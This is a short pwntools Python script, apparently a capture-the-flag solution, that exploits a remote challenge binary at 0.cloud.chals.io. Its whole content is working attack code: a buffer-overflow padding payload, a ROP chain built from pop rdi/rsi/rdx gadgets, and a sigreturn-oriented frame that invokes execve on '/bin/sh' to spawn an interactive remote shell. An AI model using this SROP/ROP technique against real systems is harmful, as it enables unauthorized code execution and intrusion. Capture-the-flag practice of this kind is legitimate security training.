from pwn import *

context.log_level = 'debug'

p = remote('0.cloud.chals.io', 34997)

pop_rdi = 0x40111f
pop_rsi = 0x401121
pop_rdx = 0x401123

frame = SigreturnFrame(arch="amd64")
frame.rax = 0x3b
frame.rdi = 0x666020
frame.rsp = 0x40109f
frame.rip = 0x40109f

payload1 = 'A'*33
p.sendafter('end\n', payload1)

payload2 = p64(0)*4 + p64(0x666050) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(0x666020) + p64(pop_rdx) + p64(0x30) + p64(0x4010c1)
payload2 += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(0x666058) + p64(pop_rdx) + p64(len(frame)+0x8) + p64(0x4010c1)
payload2 += p64(0x4010a1) + p64(0x401019)

p.sendlineafter(':', payload2)
p.send(b'/bin/sh\x00'+p64(0xf)*5)
p.send(p64(0x40109f) + bytes(frame))

p.interactive()
